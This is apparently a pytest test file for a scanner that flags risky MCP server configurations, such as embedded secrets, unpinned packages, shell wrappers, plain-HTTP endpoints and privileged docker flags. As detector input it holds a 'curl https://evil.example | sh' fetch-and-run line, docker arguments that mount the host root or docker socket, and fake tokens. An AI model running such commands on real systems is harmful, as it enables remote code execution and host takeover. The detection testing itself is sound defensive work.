from typing import Any

import pytest

from mcp_crosswalk.checks import launch
from mcp_crosswalk.checks.base import Allowlist, CheckContext, finding_id
from mcp_crosswalk.checks.registry import ALL_CHECKS, check_risk_index, get_registry
from mcp_crosswalk.models import Finding, ServerEntry

REG = get_registry()
GH = "ghp_" + "X" * 36
SLACK = "xoxb-" + "1" * 12 + "-" + "Z" * 24


def entry(**kwargs: Any) -> ServerEntry:
    base: dict[str, Any] = {"name": "srv", "client": "generic", "source_path": "/cfg.json"}
    base.update(kwargs)
    if "transport" not in kwargs:
        base["transport"] = "stdio" if kwargs.get("command") else "http"
    return ServerEntry(**base)


def run(check_id: str, e: ServerEntry, context: CheckContext | None = None) -> list[Finding]:
    return REG[check_id].run(e, context)


# --- Registry ---------------------------------------------------------------------------------


def test_registry_has_all_eleven_checks_with_metadata() -> None:
    assert list(REG) == [f"MCPXW-{n:03d}" for n in range(1, 12)]
    for check in ALL_CHECKS:
        assert check.title and check.description and check.remediation
        assert check.risk_ids
        assert check.severity in {"high", "medium", "low"}
    assert check_risk_index()["MCPXW-006"] == ("MCP02", "MCP10")
    assert check_risk_index()["MCPXW-010"] == ("MCP02", "MCP05")


def test_finding_ids_are_stable_and_distinct() -> None:
    a = finding_id("MCPXW-001", "/a.json", "s", "env:X")
    assert a == finding_id("MCPXW-001", "/a.json", "s", "env:X")
    assert len(a) == 12
    assert a != finding_id("MCPXW-001", "/a.json", "s", "env:Y")
    assert a != finding_id("MCPXW-001", "/b.json", "s", "env:X")


def test_project_scoped_entries_get_distinct_ids() -> None:
    e1 = entry(command="node", env={"API_TOKEN": "literal-value-1"}, project="/p1")
    e2 = entry(command="node", env={"API_TOKEN": "literal-value-1"}, project="/p2")
    f1, f2 = run("MCPXW-001", e1)[0], run("MCPXW-001", e2)[0]
    assert f1.id != f2.id
    assert f1.evidence.startswith("[project /p1]")


# --- MCPXW-001 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "env",
    [
        {"GITHUB_PERSONAL_ACCESS_TOKEN": GH},
        {"DB_PASSWORD": "hunter2hunter2"},
        {"SOMETHING": GH},  # prefix rule, name not secret-like
        {"LOOKS_HARMLESS_ID": "sk-" + "Y" * 40},  # prefix wins over locator suffix
        {"apiKey": "abc123def456"},
    ],
)
def test_001_positive(env: dict[str, str]) -> None:
    findings = run("MCPXW-001", entry(command="node", env=env))
    assert len(findings) == 1
    assert findings[0].severity == "high"
    value = next(iter(env.values()))
    assert value not in findings[0].evidence
    assert "[REDACTED len=" in findings[0].evidence


@pytest.mark.parametrize(
    "env",
    [
        {"LOG_LEVEL": "debug"},
        {"PATH": "/usr/bin"},
        {"API_TOKEN_FILE": "/run/secrets/token"},
        {"USE_AUTH": "true"},
        {"KEY_COUNT": "42"},
        {"TOKEN_URL": "https://auth.example.com/token"},
    ],
)
def test_001_negative(env: dict[str, str]) -> None:
    assert run("MCPXW-001", entry(command="node", env=env)) == []


@pytest.mark.parametrize(
    "value",
    ["${GITHUB_TOKEN}", "${env:GITHUB_TOKEN}", "${input:pat}", "$TOKEN", "%TOKEN%", "{{t}}", ""],
)
def test_001_references_are_not_secrets(value: str) -> None:
    assert run("MCPXW-001", entry(command="node", env={"GITHUB_TOKEN": value})) == []


# --- MCPXW-002 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("kwargs", "expected_key"),
    [
        ({"command": "node", "args": ["--api-key=abcdef123456"]}, "--api-key="),
        ({"command": "node", "args": ["--token", "abcdef123456"]}, "--token "),
        (
            {
                "command": "npx",
                "args": ["mcp-remote@1.0.0", "--header", "Authorization: Bearer abc123def"],
            },
            "header Authorization",
        ),
        ({"command": "node", "args": ["server.js", SLACK]}, "known credential prefix"),
        (
            {"command": "node", "args": ["https://u:pa55word99@h.example.com/x"]},
            "userinfo password",
        ),
        (
            {"url": "https://h.example.com/mcp?access_token=abcdef123456"},
            "query parameter access_token",
        ),
        (
            {
                "url": "https://h.example.com/mcp",
                "headers": {"Authorization": "Bearer abcdef123456"},
            },
            "header Authorization",
        ),
        ({"url": "https://h.example.com/mcp", "headers": {"X-Custom": GH}}, "header X-Custom"),
    ],
)
def test_002_positive(kwargs: dict[str, Any], expected_key: str) -> None:
    findings = run("MCPXW-002", entry(**kwargs))
    assert len(findings) == 1, findings
    assert expected_key in findings[0].evidence
    for secret in ("abcdef123456", "abc123def", SLACK, "pa55word99", GH):
        assert secret not in findings[0].evidence


@pytest.mark.parametrize(
    "kwargs",
    [
        {"command": "node", "args": ["--port", "8080", "--mode=fast", "--token-file", "/run/t"]},
        {"command": "node", "args": ["--token", "--verbose"]},
        {"url": "https://h.example.com/mcp?page=2", "headers": {"Accept": "text/event-stream"}},
        {"command": "node", "args": ["https://h.example.com/mcp"]},
        {
            "command": "docker",
            "args": ["run", "-e", "NODE_ENV=production", "-e", "API_TOKEN", "i:1"],
        },
        {"command": "docker", "args": ["run", "-e", "API_TOKEN=${API_TOKEN}", "i:1"]},
        {"command": "bash", "args": ["-c", "cd /opt/x && API_KEY=$API_KEY ./run.sh"]},
        {"url": "https://h.example.com/v1/123e4567-e89b-12d3-a456-426614174000/mcp"},
        {"url": "https://h.example.com/very-long-readable-path-segment/mcp"},
    ],
)
def test_002_negative(kwargs: dict[str, Any]) -> None:
    assert run("MCPXW-002", entry(**kwargs)) == []


@pytest.mark.parametrize(
    "kwargs",
    [
        {"command": "node", "args": ["--api-key=${API_KEY}"]},
        {"command": "node", "args": ["--token", "${env:TOKEN}"]},
        {
            "command": "npx",
            "args": ["mcp-remote@1.0.0", "--header", "Authorization: Bearer ${AUTH}"],
        },
        {"url": "https://h.example.com/mcp?token=${T}"},
        {"url": "https://h.example.com/mcp", "headers": {"Authorization": "Bearer ${input:tok}"}},
        {"url": "https://h.example.com/mcp", "headers": {"X-API-Key": "{{ key }}"}},
    ],
)
def test_002_references_are_not_secrets(kwargs: dict[str, Any]) -> None:
    assert run("MCPXW-002", entry(**kwargs)) == []


# No known prefix, so only name-based (or URL-path) detection can find it. Built by concatenation.
SECRET = "Zq7Hk2Lm9P" + "w4Rt8Vy3Nb6Xc5Jd"


@pytest.mark.parametrize(
    ("kwargs", "fragment"),
    [
        # Review finding 1: bare NAME=VALUE arguments (docker -e, --env, env-style assignments).
        (
            {"command": "docker", "args": ["run", "-e", f"GITHUB_TOKEN={SECRET}", "i:1"]},
            "GITHUB_TOKEN=",
        ),
        ({"command": "docker", "args": ["run", "--env", f"API_KEY={SECRET}", "i:1"]}, "API_KEY="),
        ({"command": "env", "args": [f"DB_PASSWORD={SECRET}", "node", "s.js"]}, "DB_PASSWORD="),
        ({"command": "bash", "args": ["-c", f"API_TOKEN={SECRET} node s.js"]}, "API_TOKEN="),
        ({"command": f"env API_TOKEN={SECRET} node s.js"}, "command env API_TOKEN="),
        # Review finding 4: credential as a URL path segment.
        ({"url": f"https://h.example.com/mcp/{SECRET}/sse"}, "path segment"),
    ],
)
def test_002_secret_forms_are_flagged_and_redacted(kwargs: dict[str, Any], fragment: str) -> None:
    from mcp_crosswalk.redact import redact_server

    e = entry(**kwargs)
    findings = run("MCPXW-002", e)
    assert len(findings) == 1, findings
    assert fragment in findings[0].evidence
    assert SECRET not in findings[0].evidence
    assert SECRET not in redact_server(e).model_dump_json()


def test_002_flags_exactly_what_inventory_redacts() -> None:
    from mcp_crosswalk.redact import redact_server

    e = entry(
        command="docker",
        args=["run", "-e", f"API_TOKEN={SECRET}", "-e", "MODE=fast", "--token", SECRET, "i:1"],
    )
    redacted = redact_server(e).args
    changed = [i for i, (a, b) in enumerate(zip(e.args, redacted, strict=True)) if a != b]
    import re

    positions = (re.match(r"args\[(?:\d+\.\.)?(\d+)\]", f.evidence) for f in run("MCPXW-002", e))
    flagged = sorted(int(m.group(1)) for m in positions if m)
    assert changed == flagged == [2, 6]


def test_008_not_raised_when_url_path_carries_token() -> None:
    assert run("MCPXW-008", entry(url=f"https://h.example.com/mcp/{SECRET}/sse")) == []


# --- MCPXW-003 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "args", "reason"),
    [
        ("npx", ["-y", "@scope/server"], "no version"),
        ("npx", ["@scope/server@latest"], "@latest"),
        ("npx", ["server@^1.2.0"], "version range"),
        ("npx", ["server@next"], "dist-tag"),
        ("npx", ["--package=@scope/server", "server-bin"], "no version"),
        ("bunx", ["server"], "no version"),
        ("pnpm", ["dlx", "server"], "no version"),
        ("uvx", ["mcp-server-fetch"], "no version"),
        ("uvx", ["mcp-server-fetch@latest"], "@latest"),
        ("uvx", ["--from", "mcp-server-git", "mcp-git"], "no version"),
        ("uv", ["tool", "run", "mcp-server-time"], "no version"),
        ("pipx", ["run", "mcp-server-time"], "no version"),
        ("docker", ["run", "-i", "--rm", "mcp/fetch"], "no tag"),
        ("docker", ["run", "-i", "-e", "X=1", "ghcr.io/org/img:latest"], ":latest"),
        ("podman", ["run", "registry:5000/img"], "no tag"),
        ("docker", ["container", "run", "img"], "no tag"),
        ("/usr/local/bin/npx.cmd", ["server"], "no version"),
    ],
)
def test_003_positive(command: str, args: list[str], reason: str) -> None:
    findings = run("MCPXW-003", entry(command=command, args=args))
    assert len(findings) == 1
    assert reason in findings[0].evidence


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@scope/server@1.2.3"]),
        ("npx", ["server@v2.0.0"]),
        ("npx", ["./local-server"]),
        ("npx", ["github:org/repo"]),
        ("npx", []),
        ("uvx", ["mcp-server-fetch==2025.4.7"]),
        ("uvx", ["mcp-server-fetch@2025.4.7"]),
        ("uvx", ["--from", "git+https://github.com/org/repo@abc123", "tool"]),
        ("pipx", ["run", "--spec", "pkg==1.0", "pkg"]),
        ("docker", ["run", "-i", "mcp/fetch:1.2"]),
        ("docker", ["run", "mcp/fetch@sha256:" + "a" * 64]),
        ("docker", ["run", "registry:5000/img:2.0"]),
        ("docker", ["ps"]),
        ("docker", ["run", "--rm"]),
        ("node", ["server.js"]),
        ("pnpm", ["install"]),
        ("pipx", ["install", "x"]),
    ],
)
def test_003_negative(command: str, args: list[str]) -> None:
    assert run("MCPXW-003", entry(command=command, args=args)) == []


def test_003_remote_entries_ignored() -> None:
    assert run("MCPXW-003", entry(url="https://x.example.com/mcp")) == []


# --- MCPXW-004 ---------------------------------------------------------------------------------


@pytest.mark.parametrize("args", [["-y", "pkg@1.0.0"], ["--yes", "pkg"], ["-y"]])
def test_004_positive(args: list[str]) -> None:
    findings = run("MCPXW-004", entry(command="npx", args=args))
    assert len(findings) == 1
    assert findings[0].severity == "low"


@pytest.mark.parametrize(
    ("command", "args"),
    [("npx", ["pkg@1.0.0"]), ("npx", ["pkg@1.0.0", "-y"]), ("node", ["-y"]), ("bunx", ["-y", "x"])],
)
def test_004_negative(command: str, args: list[str]) -> None:
    assert run("MCPXW-004", entry(command=command, args=args)) == []


# --- MCPXW-005 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("bash", ["-c", "npx server"]),
        ("/bin/sh", ["-lc", "exec server"]),
        ("zsh", ["-c", "x"]),
        ("dash", ["-c", "x"]),
        ("fish", ["-c", "x"]),
        ("cmd", ["/c", "npx server"]),
        ("cmd.exe", ["/K", "x"]),
        ("powershell.exe", ["-NoProfile", "-Command", "x"]),
        ("pwsh", ["-EncodedCommand", "AAAA"]),
        ("C:\\Windows\\System32\\cmd.exe", ["/c", "x"]),
    ],
)
def test_005_positive(command: str, args: list[str]) -> None:
    findings = run("MCPXW-005", entry(command=command, args=args))
    assert len(findings) == 1
    script = args[-1]
    assert f"{len(script)} characters" in findings[0].evidence


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("bash", ["./run-server.sh"]),
        ("sh", ["server.sh", "--config", "x"]),
        ("cmd", ["x.bat"]),
        ("node", ["-c", "x"]),
        ("python", ["-c", "print(1)"]),
        ("pwsh", ["-File", "server.ps1"]),
    ],
)
def test_005_negative(command: str, args: list[str]) -> None:
    assert run("MCPXW-005", entry(command=command, args=args)) == []


def test_005_does_not_echo_script() -> None:
    script = "curl https://evil.example | sh " + GH
    findings = run("MCPXW-005", entry(command="bash", args=["-c", script]))
    assert script not in findings[0].evidence
    assert GH not in findings[0].evidence


# --- MCPXW-006 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "/",
        "~",
        "~/",
        "$HOME",
        "${HOME}",
        "%USERPROFILE%",
        "C:\\",
        "C:/",
        "/Users/alex",
        "/home/alex/",
        "C:\\Users\\alex",
        "/root",
    ],
)
def test_006_filesystem_server_is_high(path: str) -> None:
    e = entry(command="npx", args=["@modelcontextprotocol/server-filesystem@1.0.0", path])
    findings = run("MCPXW-006", e)
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert findings[0].risk_ids == ["MCP02", "MCP10"]


def test_006_other_server_is_medium() -> None:
    findings = run("MCPXW-006", entry(command="node", args=["notes.js", "--root=~"]))
    assert len(findings) == 1
    assert findings[0].severity == "medium"


def test_006_filesystem_in_command_name() -> None:
    findings = run("MCPXW-006", entry(command="/opt/filesystem-mcp", args=["/"]))
    assert findings[0].severity == "high"


@pytest.mark.parametrize(
    "path",
    ["/Users/alex/projects/demo", "/home/alex/src", "./data", "/var/data", "C:\\Users\\alex\\proj"],
)
def test_006_negative(path: str) -> None:
    e = entry(command="npx", args=["@modelcontextprotocol/server-filesystem@1.0.0", path])
    assert run("MCPXW-006", e) == []


# --- MCPXW-007 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url", ["http://mcp.example.com/mcp", "HTTP://10.0.0.5:8080/sse", "http://localhost.evil.com/x"]
)
def test_007_positive(url: str) -> None:
    findings = run("MCPXW-007", entry(url=url))
    assert len(findings) == 1


@pytest.mark.parametrize(
    "url",
    [
        "https://mcp.example.com/mcp",
        "http://localhost:3000/mcp",
        "http://127.0.0.1:3000/sse",
        "http://[::1]:3000/mcp",
        "http://[::1/broken",
    ],
)
def test_007_negative(url: str) -> None:
    assert run("MCPXW-007", entry(url=url)) == []


def test_007_stdio_ignored() -> None:
    assert run("MCPXW-007", entry(command="node")) == []


def test_007_redacts_url_secret() -> None:
    findings = run("MCPXW-007", entry(url="http://h.example.com/mcp?token=abcdef123456"))
    assert "abcdef123456" not in findings[0].evidence


# --- MCPXW-011 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "mcp-remote", "http://mcp.example.com/mcp"]),
        ("npx", ["mcp-remote@0.1.29", "HTTP://10.0.0.5:8080/sse"]),
        ("npx", ["-y", "supergateway", "--sse", "http://gw.example.com/sse"]),
        ("uvx", ["mcp-proxy", "http://proxy.example.com/sse"]),
        ("/usr/local/bin/mcp-remote", ["http://mcp.example.com/mcp"]),
        ("npx", ["mcp-remote", "--url=http://localhost.evil.com/x"]),
    ],
)
def test_011_bridge_is_high(command: str, args: list[str]) -> None:
    findings = run("MCPXW-011", entry(command=command, args=args))
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert findings[0].risk_ids == ["MCP07"]
    assert "via " in findings[0].evidence


def test_011_other_launcher_is_medium() -> None:
    findings = run("MCPXW-011", entry(command="node", args=["bridge.js", "http://api.example.com"]))
    assert len(findings) == 1
    assert findings[0].severity == "medium"
    assert "via" not in findings[0].evidence


def test_011_url_in_command_string() -> None:
    e = entry(command="mcp-proxy http://p.example.com/sse", args=[])
    findings = run("MCPXW-011", e)
    assert len(findings) == 1
    assert "stdio launcher command" in findings[0].evidence


@pytest.mark.parametrize(
    "url",
    [
        "https://mcp.example.com/mcp",
        "http://localhost:3000/mcp",
        "http://127.0.0.1:3000/sse",
        "http://[::1]:3000/mcp",
        "http://[::1/broken",
        "http://",
    ],
)
def test_011_negative(url: str) -> None:
    assert run("MCPXW-011", entry(command="npx", args=["-y", "mcp-remote", url])) == []


def test_011_remote_entries_ignored() -> None:
    # Remote entries with a url key are MCPXW-007's job.
    assert run("MCPXW-011", entry(url="http://mcp.example.com/mcp")) == []


def test_011_bridge_name_inside_url_does_not_raise_severity() -> None:
    e = entry(command="node", args=["b.js", "http://mcp-remote.example.com/supergateway"])
    assert run("MCPXW-011", e)[0].severity == "medium"


def test_011_redacts_url_tokens() -> None:
    fake = "abcdef" + "123456"
    args = ["mcp-remote", f"http://h.example.com/mcp?token={fake}", "--header", "X: y"]
    findings = run("MCPXW-011", entry(command="npx", args=args))
    assert len(findings) == 1
    assert fake not in findings[0].evidence
    assert "[REDACTED len=12" in findings[0].evidence
    userinfo = run("MCPXW-011", entry(command="npx", args=["mcp-remote", f"http://u:{fake}@h.io/"]))
    assert fake not in userinfo[0].evidence
    prefixed = run("MCPXW-011", entry(command="npx", args=["mcp-remote", f"http://h.io/{GH}"]))
    assert GH not in prefixed[0].evidence


def test_011_one_finding_per_url_with_distinct_ids() -> None:
    args = ["mcp-remote", "http://a.example.com/", "--fallback", "http://b.example.com/"]
    findings = run("MCPXW-011", entry(command="npx", args=args))
    assert len(findings) == 2
    assert len({f.id for f in findings}) == 2


# --- MCPXW-008 ---------------------------------------------------------------------------------


def test_008_positive_and_wording() -> None:
    findings = run("MCPXW-008", entry(url="https://h.example.com/sse", transport="sse"))
    assert len(findings) == 1
    assert findings[0].severity == "low"
    assert "OAuth" in findings[0].evidence
    assert "verify" in findings[0].evidence
    description = REG["MCPXW-008"].description
    assert "OAuth" in description
    assert "at runtime" in description
    assert "not a defect" in description


@pytest.mark.parametrize(
    "kwargs",
    [
        {"url": "https://h.example.com/mcp", "headers": {"Authorization": "Bearer ${T}"}},
        {"url": "https://h.example.com/mcp", "headers": {"x-api-key": "${K}"}},
        {"url": "https://h.example.com/mcp?api_key=abcdef123456"},
        {"url": "https://h.example.com/mcp", "transport": "unknown"},
        {"command": "node"},
    ],
)
def test_008_negative(kwargs: dict[str, Any]) -> None:
    assert run("MCPXW-008", entry(**kwargs)) == []


# --- MCPXW-009 ---------------------------------------------------------------------------------

ALLOW = CheckContext(
    allowlist=Allowlist(
        entries=("approved", "@scope/ok", "mcp-server-fetch", "https://ok.example.com/")
    )
)


def test_009_requires_allowlist() -> None:
    assert REG["MCPXW-009"].requires_allowlist
    assert run("MCPXW-009", entry(name="random", command="node")) == []


@pytest.mark.parametrize(
    "kwargs",
    [
        {"name": "random", "command": "node", "args": ["x.js"]},
        {"name": "random", "command": "npx", "args": ["@scope/other@1.0.0"]},
        {"name": "random", "url": "https://evil.example.com/ok.example.com/"},
    ],
)
def test_009_positive(kwargs: dict[str, Any]) -> None:
    findings = run("MCPXW-009", entry(**kwargs), ALLOW)
    assert len(findings) == 1
    assert findings[0].risk_ids == ["MCP09"]


@pytest.mark.parametrize(
    "kwargs",
    [
        {"name": "approved", "command": "node"},
        {"name": "x", "command": "npx", "args": ["-y", "@scope/ok@2.0.0"]},
        {"name": "x", "command": "uvx", "args": ["mcp-server-fetch==1.0"]},
        {"name": "x", "url": "https://ok.example.com/mcp"},
    ],
)
def test_009_negative(kwargs: dict[str, Any]) -> None:
    assert run("MCPXW-009", entry(**kwargs), ALLOW) == []


# --- MCPXW-010 ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("args", "expected"),
    [
        (["run", "--privileged", "img:1"], "--privileged"),
        (["run", "--pid=host", "img:1"], "--pid=host"),
        (["run", "--pid", "host", "img:1"], "--pid=host"),
        (["run", "--network=host", "img:1"], "--network=host"),
        (["run", "--net", "host", "img:1"], "--network=host"),
        (["run", "--cap-add=ALL", "img:1"], "--cap-add=ALL"),
        (["run", "--cap-add", "SYS_ADMIN", "img:1"], "--cap-add=SYS_ADMIN"),
        (["run", "-v", "/:/host", "img:1"], "root or home"),
        (["run", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img:1"], "runtime socket"),
        (["run", "--volume=/home/alex:/data", "img:1"], "root or home"),
        (["run", "-v", "C:\\Users\\alex:/data", "img:1"], "root or home"),
        (["run", "--mount", "type=bind,source=/,target=/host", "img:1"], "--mount"),
        (["container", "run", "--privileged", "img:1"], "--privileged"),
    ],
)
def test_010_positive(args: list[str], expected: str) -> None:
    findings = run("MCPXW-010", entry(command="docker", args=args))
    assert len(findings) == 1, findings
    assert expected in findings[0].evidence
    assert findings[0].risk_ids == ["MCP02", "MCP05"]


def test_010_podman_and_multiple() -> None:
    args = ["run", "--privileged", "--network=host", "-v", "~:/root", "img:1"]
    findings = run("MCPXW-010", entry(command="podman", args=args))
    assert len(findings) == 3
    assert len({f.id for f in findings}) == 3


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("docker", ["run", "-i", "--rm", "-v", "/srv/data:/data:ro", "img:1"]),
        ("docker", ["run", "--network=bridge", "--cap-add=NET_BIND_SERVICE", "img:1"]),
        ("docker", ["run", "--mount", "type=bind,source=/srv/x,target=/x", "img:1"]),
        ("docker", ["run", "--mount", "type=tmpfs,target=/x", "img:1"]),
        ("docker", ["ps", "--privileged"]),
        ("node", ["run", "--privileged"]),
        # Review finding 10: arguments after the image belong to the container process.
        ("docker", ["run", "-i", "img:1", "--network", "host", "--privileged"]),
    ],
)
def test_010_negative(command: str, args: list[str]) -> None:
    assert run("MCPXW-010", entry(command=command, args=args)) == []


# --- Launch helpers ----------------------------------------------------------------------------


def test_launch_helpers() -> None:
    assert launch.basename("C:\\Program Files\\nodejs\\npx.CMD") == "npx"
    assert launch.basename(None) == ""
    assert launch.npm_name("@scope/pkg@1.0.0") == "@scope/pkg"
    assert launch.npm_name("pkg") == "pkg"
    assert launch.pypi_name("pkg[extra]==1.0") == "pkg"
    assert launch.image_name("ghcr.io/org/img:1.0@sha256:abc") == "ghcr.io/org/img"
    assert launch.image_name("registry:5000/img") == "registry:5000/img"
    assert launch.package_launch("npx", ["--", "pkg@1"]) is not None
    assert launch.package_launch("npx", ["--"]) is None
    assert launch.package_launch("pnpm", ["dlx"]) is None
    assert launch.package_launch("pipx", ["run"]) is None
    assert launch.package_launch("uvx", []) is None
